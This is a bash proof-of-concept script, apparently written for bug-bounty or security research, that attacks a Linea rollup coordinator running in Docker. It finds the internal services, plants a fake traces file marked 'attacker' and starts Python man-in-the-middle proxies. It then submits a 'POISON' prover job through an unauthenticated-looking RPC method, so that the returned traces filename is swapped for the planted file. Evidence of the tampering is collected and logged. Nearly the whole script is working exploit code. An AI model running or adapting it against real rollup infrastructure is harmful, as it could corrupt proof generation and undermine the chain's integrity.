#!/bin/bash
set -u
OUT="poc17_results.txt"; : > "$OUT"; exec > >(tee -a "$OUT") 2>&1
C=$(docker ps --format '{{.Names}}' | grep -iE coordinator | head -n1)
P=$(docker logs "$C" 2>&1 | grep -oiE 'JSON-RPC server started port=[0-9]+' | tail -n1 | grep -oE '[0-9]+$'); P=${P:-9546}
IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' "$C" | awk '{print $1}')
GW=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}} {{end}}' "$C" | awk '{print $1}')
RPC="http://$IP:$P/"
HD=$(docker inspect -f '{{range .Mounts}}{{if eq .Destination "/data"}}{{.Source}}{{end}}{{end}}' "$C")
BESU=""
for c in $(docker ps --format '{{.Names}}' | grep -v "^$C$"); do
  bip=$(docker inspect -f '{{range $k,$v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$c" | awk '{print $1}')
  r=$(curl -s -m 2 -X POST "http://$bip:8545" -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":1}],"id":1}' 2>/dev/null)
  echo "$r" | grep -q tracesCounters && { BESU="http://$bip:8545"; break; }
done
SHOMEI=""
for c in $(docker ps --format '{{.Names}}' | grep -viE "coordinator"); do
  sip=$(docker inspect -f '{{range $k,$v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$c" | awk '{print $1}')
  r=$(curl -s -m 2 -X POST "http://$sip:8888" -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","method":"rollup_getZkEVMStateMerkleProofV0","params":[{"startBlockNumber":1,"endBlockNumber":1}],"id":1}' 2>/dev/null)
  echo "$r" | grep -q jsonrpc && { SHOMEI="http://$sip:8888"; break; }
done
HX=$(curl -s -m 5 -X POST "$BESU" -H 'Content-Type: application/json' -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' 2>/dev/null | grep -oE '0x[0-9a-fA-F]+' | head -n1)
HEAD=$(( ${HX:-0} )); START=$((HEAD-1)); END=$HEAD
mkdir -p "$HD/conflation-backtesting"
MARK="P17$(date +%s)"; export MARK BESU_URL="$BESU" SHOMEI_URL="$SHOMEI"
mkdir -p "$HD/traces/v2/conflated"
printf '{"fake":"traces","marker":"%s"}' "$MARK" > "$HD/traces/v2/conflated/$MARK.attacker.lt.gz"
echo "[+] RPC=$RPC GW=$GW BESU=$BESU SHOMEI=$SHOMEI HEAD=$HEAD RANGE=$START..$END"
[ -z "$SHOMEI" ] && { echo "[-] shomei tidak ketemu"; exit 1; }

# MITM traces (:12347, tamper filename utk /pf) + MITM shomei (:12348, passthrough + LOG PENUH)
for p in 12347 12348; do fuser -k $p/tcp 2>/dev/null; done; sleep 1
rm -f /tmp/v17_shomei.log /tmp/v17_traces.log
python3 - <<'PY' >/dev/null 2>&1 &
import http.server, json, os, urllib.request, urllib.error
UP=os.environ["BESU_URL"]; MARK=os.environ["MARK"]
FAKE="/data/traces/v2/conflated/%s.attacker.lt.gz" % MARK
def fwd(url,body):
    req=urllib.request.Request(url,data=body,headers={"Content-Type":"application/json"},method="POST")
    try:
        with urllib.request.urlopen(req,timeout=120) as r: return 200,r.read()
    except urllib.error.HTTPError as e: return e.code,e.read()
    except Exception as e: return 0,('{"jsonrpc":"2.0","id":1,"error":{"code":-32000,"message":"p17:%s"}}'%e).encode()
class T(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0); body=self.rfile.read(n)
        try: m=json.loads(body).get("method","")
        except: m=""
        code,resp=fwd(UP,body); note=""
        if code==200 and m=="linea_generateConflatedTracesToFileV2" and self.path.endswith("/pf"):
            try:
                o=json.loads(resp); res=o.get("result") or {}
                if "conflatedTracesFileName" in res:
                    note="[TAMPER -> %s]"%FAKE
                    res["conflatedTracesFileName"]=FAKE; res["tracesEngineVersion"]="attacker-1"
                    o["result"]=res; resp=json.dumps(o).encode()
            except Exception as e: note="[err]"
        with open("/tmp/v17_traces.log","a") as f:
            f.write(">> %s %s %s\n   resp: %s\n"%(self.path,m,note,resp[:250].decode(errors="replace")))
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(resp))); self.end_headers(); self.wfile.write(resp)
    def log_message(self,*a): pass
http.server.ThreadingHTTPServer(("0.0.0.0",12347),T).serve_forever()
PY
TP=$!
python3 - <<'PY' >/dev/null 2>&1 &
import http.server, json, os, urllib.request, urllib.error
SH=os.environ["SHOMEI_URL"]
def fwd(body):
    req=urllib.request.Request(SH,data=body,headers={"Content-Type":"application/json"},method="POST")
    try:
        with urllib.request.urlopen(req,timeout=60) as r: return 200,r.read()
    except urllib.error.HTTPError as e: return e.code,e.read()
    except Exception as e: return 0,('{"jsonrpc":"2.0","id":1,"error":{"code":-32000,"message":"p17sh:%s"}}'%e).encode()
class S(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0); body=self.rfile.read(n)
        code,resp=fwd(body)
        with open("/tmp/v17_shomei.log","a") as f:
            f.write("REQ : %s\nRESP: %s\n"%(body.decode(errors="replace")[:400],resp[:600].decode(errors="replace")))
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(resp))); self.end_headers(); self.wfile.write(resp)
    def log_message(self,*a): pass
http.server.ThreadingHTTPServer(("0.0.0.0",12348),S).serve_forever()
PY
SP=$!; sleep 1
echo "[+] MITM traces :12347 (tamper /pf) | MITM shomei :12348 (passthrough+log)"

sub(){ # $1 traces, $2 shomei
  curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
   \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
   \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
   \"tracesApi\":{\"endpoint\":\"$1\",\"requestLimitPerEndpoint\":100},
   \"shomeiApi\":{\"endpoint\":\"$2\",\"requestLimitPerEndpoint\":100}}]}"
}
echo -e "\n[1] CONTROL job (endpoint 100% asli):"
RC=$(sub "$BESU" "$SHOMEI"); echo "    $RC"
JC=$(echo "$RC" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)
echo "[2] POISON job (traces=/pf, shomei=passthrough):"
RP=$(sub "http://$GW:12347/pf" "http://$GW:12348"); echo "    $RP"
JP=$(echo "$RP" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)
echo "    CTRL=$JC POISON=$JP"

echo -e "\n[3] Poll 360s:"
for i in $(seq 1 36); do
  sleep 10
  FC=$(find "$HD/conflation-backtesting/$JC" -name '*.json' -type f 2>/dev/null | head -n1)
  FP=$(find "$HD/conflation-backtesting/$JP" -name '*.json' -type f 2>/dev/null | head -n1)
  [ -n "$FC" ] || [ -n "$FP" ] && { echo "    [+] file muncul detik $((i*10))"; break; }
  [ $((i%3)) = 0 ] && printf "    %ds ctrl=%s poison=%s\n" $((i*10)) "$([ -n "$FC" ]&&echo Y||echo -)" "$([ -n "$FP" ]&&echo Y||echo -)"
done

echo -e "\n[4] EVIDENCE"
echo "(a) SHOMEI REQ/RESP (data yang belum pernah terlihat):"
cat /tmp/v17_shomei.log 2>/dev/null | head -30 | sed 's/^/    /'
echo -e "\n(b) TRACES MITM (tamper):"
grep -E "^(>>|   resp)" /tmp/v17_traces.log 2>/dev/null | head -15 | sed 's/^/    /'
echo -e "\n(c) Job status:"
curl -s --max-time 5 -X POST "$RPC" -H 'Content-Type: application/json' \
  -d "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_getReconflationJobsStatus\",\"params\":[\"$JC\",\"$JP\"],\"id\":1}" | sed 's/^/    /'
echo -e "\n(d) Request files:"
for J in "$JC" "$JP"; do
  echo "  job $J:"; find "$HD/conflation-backtesting/$J" -type f 2>/dev/null | sed 's/^/    /'
  for f in $(find "$HD/conflation-backtesting/$J" -name '*.json' 2>/dev/null | head -2); do
    grep -oE '"conflatedExecutionTracesFile"[^,}]*|"tracesEngineVersion"[^,}]*' "$f" | sed 's/^/      /'
    grep -q "$MARK" "$f" && echo "      [!!!] MARKER ATTACKER di request file"
  done
done
echo -e "\n(e) Log job (non-config, error terakhir):"
for J in "$JC" "$JP"; do
  echo "  --- job $J:"
  docker logs "$C" 2>&1 | grep "job_${J}" | grep -v coordinatorConfig= | grep -viE "Awaiting|found. Resuming|started successfully" | tail -6 | cut -c1-230 | sed 's/^/    /'
done
kill $TP $SP 2>/dev/null; fuser -k 12347/tcp 12348/tcp 2>/dev/null
echo -e "\nCleanup: docker restart $C; rm -rf $HD/conflation-backtesting/*"
GAPEOF
chmod +x poc17.sh && ./poc17.sh
